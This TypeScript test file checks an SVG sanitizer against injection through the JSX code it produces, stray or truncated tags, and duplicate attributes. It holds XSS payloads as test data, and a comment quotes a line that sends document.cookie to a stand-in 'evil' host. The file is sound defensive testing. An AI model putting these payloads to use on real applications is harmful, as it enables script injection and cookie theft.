import { describe, it, expect } from "bun:test";
import { sanitizeSvg } from "../../security/svg-sanitizer.js";

/**
 * Regression tests for three defects found while IMPLEMENTING story 005, none of
 * which the story's pre-authored suite reaches.
 *
 * The pre-authored tests reason about SVG. They are thorough there — 14 measured
 * bypasses, generated attribute order, a fixed-point property. But the
 * sanitizer's output does not stop at SVG: `logo-search.tool.ts` interpolates it
 * into a JSX/TSX source file that an agent writes into the user's project. That
 * second boundary was never modelled, in story.md or design.md, and the defects
 * below live there or just outside the parser's reach:
 *
 *   1. `{` and `}` were not escaped. In JSX children `{` opens an expression
 *      container holding arbitrary JavaScript, so a logo carrying
 *      `{fetch("https://evil/"+document.cookie)}` in a text node produced a
 *      component with a LIVE call in it. Measured through Bun's TSX transpiler:
 *      the compiled output carried `fetch(...)` as a call, not as text. That is
 *      exactly the consequence story.md's Summary names — untrusted remote
 *      content becoming source code that executes in the user's application.
 *
 *   2. A STRAY END TAG and an EOF-TRUNCATED TAG are echoed by lol-html without
 *      ever being offered to a handler, so they bypassed the element allowlist
 *      entirely. Because an end-tag name may contain `<`, `</a<script>` carried a
 *      live `<script` into the output.
 *
 *   3. A DUPLICATE ATTRIBUTE was URI-checked only in its first occurrence, since
 *      `getAttribute` returns the first. Browsers use the first attribute and
 *      JSX/React use the LAST — so the value reaching the user's component was
 *      precisely the one never checked.
 *
 * All three passed the full pre-authored suite while broken. They are pinned here
 * so a refactor cannot reintroduce them silently, which is the same obligation R4
 * places on the payload space.
 *
 * No test here reaches the network, and none evaluates generated code: the JSX
 * checks transpile and INSPECT, they never run the result.
 */

/** Every LIVE tag in the output. Escaped text (`&lt;img …&gt;`) yields none. */
function liveTags(markup: string): readonly string[] {
  return markup.match(/<[^>]*>/g) ?? [];
}

/** The text between tags — where a JSX expression container would have to sit. */
function textOutsideTags(markup: string): string {
  return markup.replace(/<[^>]*>/g, "");
}

/** Blanks every string literal, so a token surviving only as text disappears. */
function stripStringLiterals(source: string): string {
  return source
    .replace(/"(?:[^"\\]|\\.)*"/g, '""')
    .replace(/'(?:[^'\\]|\\.)*'/g, "''")
    .replace(/`(?:[^`\\]|\\.)*`/g, "``");
}

/**
 * Builds the component `convertToFormat` would emit, transpiles it as TSX, and
 * reports whether the sentinel survives as a CALL rather than as text.
 *
 * This mirrors the real consumer instead of asserting on the sanitizer's string
 * alone. The question is not whether the payload survives as characters — after
 * escaping it does, harmlessly — but whether it survives as code. A sanitized
 * payload compiles to `children: "{PWN()}"`, a string; an unsanitized one
 * compiles to `children: PWN()`, a call. Stripping string literals is what
 * separates the two, and nothing here is executed.
 */
function transpilesToLiveCall(markup: string): boolean {
  const jsx = markup.replace(/class=/g, "className=");
  const compiled = new Bun.Transpiler({ loader: "tsx" }).transformSync(
    `export function Icon() { return (${jsx}) }`
  );

  return /\bPWN\s*\(/.test(stripStringLiterals(compiled));
}

describe("sanitizeSvg — the JSX consumer boundary", () => {
  const BRACE_PAYLOADS: ReadonlyArray<readonly [string, string]> = [
    ["a bare expression container in svg text", '<svg viewBox="0 0 9 9">{PWN()}</svg>'],
    ["inside <title>", "<svg><title>{PWN()}</title></svg>"],
    ["inside <text>", "<svg><text>{PWN()}</text></svg>"],
    ["inside <desc>", "<svg><desc>{PWN()}</desc></svg>"],
    ["inside <tspan>", "<svg><g><tspan>{PWN()}</tspan></g></svg>"],
    ["an arrow function", "<svg><title>{(() => PWN())}</title></svg>"],
    ["after a benign path", '<svg><path d="M0 0"/>{PWN()}</svg>'],
  ];
  // A computed call such as `{globalThis["PWN"]()}` is deliberately NOT listed:
  // `transpilesToLiveCall` blanks string literals, so it cannot see the sentinel
  // inside the index and reports `false` even for the UNSANITISED payload. An
  // assertion that passes whether or not the code is correct is exactly the
  // defect R4 exists to close, so it is left out rather than left vacuous. The
  // brace-escaping assertion above covers that payload on the structural side.

  for (const [description, payload] of BRACE_PAYLOADS) {
    it(`escapes the braces of ${description}, so no expression container survives`, async () => {
      const output = await sanitizeSvg(payload);

      expect(textOutsideTags(output)).not.toContain("{");
      expect(textOutsideTags(output)).not.toContain("}");
    });

    it(`compiles ${description} to text rather than to a call`, async () => {
      expect(transpilesToLiveCall(await sanitizeSvg(payload))).toBe(false);
    });
  }

  it("the detector is not vacuous: the same payload IS a live call when not sanitized", () => {
    // Without this, every assertion above would also pass against a sanitizer
    // that did nothing at all — which is the failure mode this story is about.
    expect(transpilesToLiveCall('<svg viewBox="0 0 9 9">{PWN()}</svg>')).toBe(true);
  });

  it("leaves a benign logo byte-identical and free of any call", async () => {
    const benign =
      '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="logo"><path d="M12 0C5.37 0 0 5.37 0 12z" fill="#181717"/></svg>';

    const output = await sanitizeSvg(benign);

    expect(output).toBe(benign);
    expect(transpilesToLiveCall(output)).toBe(false);
  });

  it("escapes a CDATA marker, which is not valid JSX", async () => {
    const output = await sanitizeSvg("<svg><![CDATA[<script>PWN()</script>]]></svg>");

    expect(output).not.toContain("<![CDATA[");
  });
});

describe("sanitizeSvg — constructs the parser never offers to a handler", () => {
  /**
   * lol-html echoes these verbatim: they reach no element handler, so the
   * allowlist never sees them. An end-tag NAME may contain `<`, which is what
   * turns an inert-looking stray tag into a live `<script` in the output.
   */
  const STRAY: ReadonlyArray<readonly [string, string]> = [
    ["a stray end tag whose name absorbs a script tag", "</a<script>"],
    ["the same via a scheme-shaped name", "</javascript:<script>"],
    ["a stray end tag for a rejected element", "</script><script>"],
    ["an empty stray end tag", "</<script>"],
    ["an end tag carrying attributes", '<svg foo="bar"></svg baz="qux">'],
    ["a start tag truncated at EOF", '<script src="https://evil.example/x"'],
    ["a rejected element truncated at EOF", "<svg><script"],
    ["a partial tag name at EOF", "<scr"],
  ];

  for (const [description, input] of STRAY) {
    it(`admits no live tag from ${description}`, async () => {
      const output = await sanitizeSvg(input);

      expect(output).not.toMatch(/<script/i);
      for (const tag of liveTags(output)) {
        expect(tag).not.toMatch(/\son[a-z]+\s*=/i);
      }
    });
  }

  it("stays a fixed point for every one of them", async () => {
    for (const [, input] of STRAY) {
      const once = await sanitizeSvg(input);

      expect(await sanitizeSvg(once)).toBe(once);
    }
  });
});

describe("sanitizeSvg — every occurrence of a duplicate attribute is checked", () => {
  /**
   * `getAttribute` returns the FIRST occurrence. Checking by name alone therefore
   * validated a safe value and emitted a dangerous one — and JSX/React resolve a
   * duplicate to the LAST, so the unchecked value is the one that would have
   * reached the user's component.
   */
  const DUPLICATES: ReadonlyArray<readonly [string, string]> = [
    ["href, safe first", '<svg><use href="#a" href="javascript:alert(1)"/></svg>'],
    ["href, dangerous first", '<svg><use href="javascript:alert(1)" href="#a"/></svg>'],
    ["xlink:href", '<svg><use xlink:href="#ok" xlink:href="javascript:alert(1)"/></svg>'],
    ["fill", '<svg><path fill="#fff" fill="url(javascript:alert(1))"/></svg>'],
    ["fill, dangerous first", '<svg><path fill="url(javascript:alert(1))" fill="#fff"/></svg>'],
    ["an event handler twice", '<svg onload="alert(1)" onload="alert(2)"></svg>'],
  ];

  for (const [description, input] of DUPLICATES) {
    it(`removes the dangerous value when ${description} is duplicated`, async () => {
      const output = await sanitizeSvg(input);

      expect(output.replace(/\s+/g, "").toLowerCase()).not.toContain("javascript:");
      for (const tag of liveTags(output)) {
        expect(tag).not.toMatch(/\son[a-z]+\s*=/i);
      }
    });
  }

  it("keeps a duplicated SAFE attribute rather than destroying the element", async () => {
    const output = await sanitizeSvg('<svg><path d="M0 0" d="M1 1"/></svg>');

    expect(output).toContain("<path");
    expect(output).toContain("d=");
  });
});
